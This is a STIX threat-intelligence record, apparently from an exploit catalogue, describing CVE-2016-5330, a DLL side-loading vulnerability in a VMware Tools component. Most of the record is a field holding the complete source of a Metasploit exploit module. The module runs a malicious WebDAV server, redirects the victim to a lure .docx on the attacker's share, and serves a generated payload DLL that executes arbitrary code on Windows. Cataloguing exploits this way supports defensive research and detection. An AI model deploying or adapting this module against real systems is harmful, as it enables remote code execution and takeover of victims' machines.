{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9fc3097a-7025-455f-8560-5fbc87af9ab9",
    "created": "2024-08-14T16:45:34.415981Z",
    "modified": "2024-08-14T16:45:34.415985Z",
    "name": "DLL Side Loading Vulnerability in VMware Host Guest Client Redirector",
    "description": " A DLL side loading vulnerability was found in the VMware Host Guest Client Redirector a component of VMware Tools. This issue can be exploited by luring a victim into opening a document from the attacker's share. An attacker can exploit this issue to execute arbitrary code with the privileges of the target user. This can potentially result in the attacker taking complete control of the affected system. If the WebDAV Mini-Redirector is enabled, it is possible to exploit this issue over the internet. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/vmhgfs_webdav_dll_sideload.rb",
            "external_id": "vmhgfs_webdav_dll_sideload.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-5330"
        },
        {
            "source_name": "reference",
            "url": "https://securify.nl/advisory/SFY20151201/dll_side_loading_vulnerability_in_vmware_host_guest_client_redirector.html"
        },
        {
            "source_name": "reference",
            "url": "https://www.vmware.com/in/security/advisories/VMSA-2016-0010.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'DLL Side Loading Vulnerability in VMware Host Guest Client Redirector',\n      'Description'    => %q{\n      A DLL side loading vulnerability was found in the VMware Host Guest Client Redirector,\n      a component of VMware Tools. This issue can be exploited by luring a victim into\n      opening a document from the attacker's share. An attacker can exploit this issue to\n      execute arbitrary code with the privileges of the target user. This can potentially\n      result in the attacker taking complete control of the affected system. If the WebDAV\n      Mini-Redirector is enabled, it is possible to exploit this issue over the internet.\n      },\n      'Author'         => 'Yorick Koster',\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2016-5330'],\n          ['URL', 'https://securify.nl/advisory/SFY20151201/dll_side_loading_vulnerability_in_vmware_host_guest_client_redirector.html'],\n          ['URL', 'https://www.vmware.com/in/security/advisories/VMSA-2016-0010.html'],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread'\n        },\n      'Payload'        => { 'Space' => 2048, },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows x64', {'Arch' => ARCH_X64,} ],\n          [ 'Windows x86', {'Arch' => ARCH_X86,} ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2016-08-05',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptPort.new('SRVPORT',     [ true, \"The daemon port to listen on (do not change)\", 80 ]),\n        OptString.new('URIPATH',   [ true, \"The URI to use (do not change)\", \"/\" ]),\n        OptString.new('BASENAME',  [ true, \"The base name for the docx file\", \"Document1\" ]),\n        OptString.new('SHARENAME', [ true, \"The name of the top-level share\", \"documents\" ])\n      ])\n\n    # no SSL\n    deregister_options('SSL', 'SSLVersion', 'SSLCert')\n  end\n\n\n  def on_request_uri(cli, request)\n    case request.method\n    when 'OPTIONS'\n      process_options(cli, request)\n    when 'PROPFIND'\n      process_propfind(cli, request)\n    when 'GET'\n      process_get(cli, request)\n    else\n      print_status(\"#{request.method} => 404 (#{request.uri})\")\n      resp = create_response(404, \"Not Found\")\n      resp.body = \"\"\n      resp['Content-Type'] = 'text/html'\n      cli.send_response(resp)\n    end\n  end\n\n\n  def process_get(cli, request)\n    myhost = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']\n    webdav = \"\\\\\\\\#{myhost}\\\\\"\n\n    if (request.uri =~ /vmhgfs\\.dll$/i)\n      print_status(\"GET => DLL Payload (#{request.uri})\")\n      return if ((p = regenerate_payload(cli)) == nil)\n      data = generate_payload_dll({ :arch => target['Arch'], :code => p.encoded })\n      send_response(cli, data, { 'Content-Type' => 'application/octet-stream' })\n      return\n    end\n\n    if (request.uri =~ /\\.docx$/i)\n      print_status(\"GET => DOCX (#{request.uri})\")\n      send_response(cli, \"\", { 'Content-Type' => 'application/vnd.openxmlformats-officedocument.wordprocessingml.document' })\n      return\n    end\n\n    if (request.uri[-1,1] == \"/\" or request.uri =~ /index\\.html?$/i)\n      print_status(\"GET => REDIRECT (#{request.uri})\")\n      resp = create_response(200, \"OK\")\n      resp.body = %Q|<html><head><meta http-equiv=\"refresh\" content=\"0;URL=file:\\\\\\\\#{@exploit_unc}#{datastore['SHARENAME']}\\\\#{datastore['BASENAME']}.docx\"></head><body></body></html>|\n      resp['Content-Type'] = 'text/html'\n      cli.send_response(resp)\n      return\n    end\n\n    print_status(\"GET => 404 (#{request.uri})\")\n    resp = create_response(404, \"Not Found\")\n    resp.body = \"\"\n    cli.send_response(resp)\n  end\n\n  #\n  # OPTIONS requests sent by the WebDav Mini-Redirector\n  #\n  def process_options(cli, request)\n    print_status(\"OPTIONS #{request.uri}\")\n    headers = {\n      'MS-Author-Via' => 'DAV',\n      'DASL'          => '<DAV:sql>',\n      'DAV'           => '1, 2',\n      'Allow'         => 'OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH',\n      'Public'        => 'OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK',\n      'Cache-Control' => 'private'\n    }\n    resp = create_response(207, \"Multi-Status\")\n    headers.each_pair {|k,v| resp[k] = v }\n    resp.body = \"\"\n    resp['Content-Type'] = 'text/xml'\n    cli.send_response(resp)\n  end\n\n  #\n  # PROPFIND requests sent by the WebDav Mini-Redirector\n  #\n  def process_propfind(cli, request)\n    path = request.uri\n    print_status(\"PROPFIND #{path}\")\n    body = ''\n\n    my_host   = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']\n    my_uri    = \"http://#{my_host}/\"\n\n    if path !~ /\\/$/\n\n      if blacklisted_path?(path)\n        print_status \"PROPFIND => 404 (#{path})\"\n        resp = create_response(404, \"Not Found\")\n        resp.body = \"\"\n        cli.send_response(resp)\n        return\n      end\n\n      if path.index(\".\")\n        print_status \"PROPFIND => 207 File (#{path})\"\n        body = %Q|<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<D:multistatus xmlns:D=\"DAV:\" xmlns:b=\"urn:uuid:c2f41010-65b3-11d1-a29f-00aa00c14882/\">\n<D:response xmlns:lp1=\"DAV:\" xmlns:lp2=\"http://apache.org/dav/props/\">\n<D:href>#{path}</D:href>\n<D:propstat>\n<D:prop>\n<lp1:resourcetype/>\n<lp1:creationdate>#{gen_datestamp}</lp1:creationdate>\n<lp1:getcontentlength>#{rand(0x100000)+128000}</lp1:getcontentlength>\n<lp1:getlastmodified>#{gen_timestamp}</lp1:getlastmodified>\n<lp1:getetag>\"#{\"%.16x\" % rand(0x100000000)}\"</lp1:getetag>\n<lp2:executable>T</lp2:executable>\n<D:supportedlock>\n<D:lockentry>\n<D:lockscope><D:exclusive/></D:lockscope>\n<D:locktype><D:write/></D:locktype>\n</D:lockentry>\n<D:lockentry>\n<D:lockscope><D:shared/></D:lockscope>\n<D:locktype><D:write/></D:locktype>\n</D:lockentry>\n</D:supportedlock>\n<D:lockdiscovery/>\n<D:getcontenttype>application/octet-stream</D:getcontenttype>\n</D:prop>\n<D:status>HTTP/1.1 200 OK</D:status>\n</D:propstat>\n</D:response>\n</D:multistatus>\n|\n        # send the response\n        resp = create_response(207, \"Multi-Status\")\n        resp.body = body\n        resp['Content-Type'] = 'text/xml; charset=\"utf8\"'\n        cli.send_response(resp)\n        return\n      else\n        print_status \"PROPFIND => 301 (#{path})\"\n        resp = create_response(301, \"Moved\")\n        resp[\"Location\"] = path + \"/\"\n        resp['Content-Type'] = 'text/html'\n        cli.send_response(resp)\n        return\n      end\n    end\n\n    print_status \"PROPFIND => 207 Directory (#{path})\"\n    body = %Q|<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<D:multistatus xmlns:D=\"DAV:\" xmlns:b=\"urn:uuid:c2f41010-65b3-11d1-a29f-00aa00c14882/\">\n<D:response xmlns:lp1=\"DAV:\" xmlns:lp2=\"http://apache.org/dav/props/\">\n<D:href>#{path}</D:href>\n<D:propstat>\n<D:prop>\n<lp1:resourcetype><D:collection/></lp1:resourcetype>\n<lp1:creationdate>#{gen_datestamp}</lp1:creationdate>\n<lp1:getlastmodified>#{gen_timestamp}</lp1:getlastmodified>\n<lp1:getetag>\"#{\"%.16x\" % rand(0x100000000)}\"</lp1:getetag>\n<D:supportedlock>\n<D:lockentry>\n<D:lockscope><D:exclusive/></D:lockscope>\n<D:locktype><D:write/></D:locktype>\n</D:lockentry>\n<D:lockentry>\n<D:lockscope><D:shared/></D:lockscope>\n<D:locktype><D:write/></D:locktype>\n</D:lockentry>\n</D:supportedlock>\n<D:lockdiscovery/>\n<D:getcontenttype>httpd/unix-directory</D:getcontenttype>\n</D:prop>\n<D:status>HTTP/1.1 200 OK</D:status>\n</D:propstat>\n</D:response>\n|\n\n    if request[\"Depth\"].to_i > 0\n      trail = path.split(\"/\")\n      trail.shift\n      case trail.length\n      when 0\n        body << generate_shares(path)\n      when 1\n        body << generate_files(path)\n      end\n    else\n      print_status \"PROPFIND => 207 Top-Level Directory\"\n    end\n\n    body << \"</D:multistatus>\"\n\n    body.gsub!(/\\t/, '')\n\n    # send the response\n    resp = create_response(207, \"Multi-Status\")\n    resp.body = body\n    resp['Content-Type'] = 'text/xml; charset=\"utf8\"'\n    cli.send_response(resp)\n  end\n\n  def generate_shares(path)\n    share_name = datastore['SHARENAME']\n%Q|\n<D:response xmlns:lp1=\"DAV:\" xmlns:lp2=\"http://apache.org/dav/props/\">\n<D:href>#{path}#{share_name}/</D:href>\n<D:propstat>\n<D:prop>\n<lp1:resourcetype><D:collection/></lp1:resourcetype>\n<lp1:creationdate>#{gen_datestamp}</lp1:creationdate>\n<lp1:getlastmodified>#{gen_timestamp}</lp1:getlastmodified>\n<lp1:getetag>\"#{\"%.16x\" % rand(0x100000000)}\"</lp1:getetag>\n<D:supportedlock>\n<D:lockentry>\n<D:lockscope><D:exclusive/></D:lockscope>\n<D:locktype><D:write/></D:locktype>\n</D:lockentry>\n<D:lockentry>\n<D:lockscope><D:shared/></D:lockscope>\n<D:locktype><D:write/></D:locktype>\n</D:lockentry>\n</D:supportedlock>\n<D:lockdiscovery/>\n<D:getcontenttype>httpd/unix-directory</D:getcontenttype>\n</D:prop>\n<D:status>HTTP/1.1 200 OK</D:status>\n</D:propstat>\n</D:response>\n|\n  end\n\n  def generate_files(path)\n    trail = path.split(\"/\")\n    return \"\" if trail.length < 2\n\n    %Q|\n<D:response xmlns:lp1=\"DAV:\" xmlns:lp2=\"http://apache.org/dav/props/\">\n<D:href>#{path}#{datastore['BASENAME']}.docx</D:href>\n<D:propstat>\n<D:prop>\n<lp1:resourcetype/>\n<lp1:creationdate>#{gen_datestamp}</lp1:creationdate>\n<lp1:getcontentlength>#{rand(0x10000)+120}</lp1:getcontentlength>\n<lp1:getlastmodified>#{gen_timestamp}</lp1:getlastmodified>\n<lp1:getetag>\"#{\"%.16x\" % rand(0x100000000)}\"</lp1:getetag>\n<lp2:executable>T</lp2:executable>\n<D:supportedlock>\n<D:lockentry>\n<D:lockscope><D:exclusive/></D:lockscope>\n<D:locktype><D:write/></D:locktype>\n</D:lockentry>\n<D:lockentry>\n<D:lockscope><D:shared/></D:lockscope>\n<D:locktype><D:write/></D:locktype>\n</D:lockentry>\n</D:supportedlock>\n<D:lockdiscovery/>\n<D:getcontenttype>application/octet-stream</D:getcontenttype>\n</D:prop>\n<D:status>HTTP/1.1 200 OK</D:status>\n</D:propstat>\n</D:response>\n|\n  end\n\n  def gen_timestamp(ttype=nil)\n    ::Time.now.strftime(\"%a, %d %b %Y %H:%M:%S GMT\")\n  end\n\n  def gen_datestamp(ttype=nil)\n    ::Time.now.strftime(\"%Y-%m-%dT%H:%M:%SZ\")\n  end\n\n  # This method rejects requests that are known to break exploitation\n  def blacklisted_path?(uri)\n    return true if uri =~ /\\.exe/i\n    return true if uri =~ /\\.(config|manifest)/i\n    return true if uri =~ /desktop\\.ini/i\n    return true if uri =~ /lib.*\\.dll/i\n    return true if uri =~ /\\.tmp$/i\n    return true if uri =~ /(pcap|packet)\\.dll/i\n    false\n  end\n\n  def exploit\n\n    myhost = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address('50.50.50.50') : datastore['SRVHOST']\n\n    @exploit_unc  = \"\\\\\\\\#{myhost}\\\\\"\n\n    if datastore['SRVPORT'].to_i != 80 || datastore['URIPATH'] != '/'\n      fail_with(Failure::Unknown, 'Using WebDAV requires SRVPORT=80 and URIPATH=/')\n    end\n\n    print_status(\"Files are available at #{@exploit_unc}#{datastore['SHARENAME']}\")\n\n    super\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-08-05",
    "x_mitre_platforms": [
        "win'"
    ]
}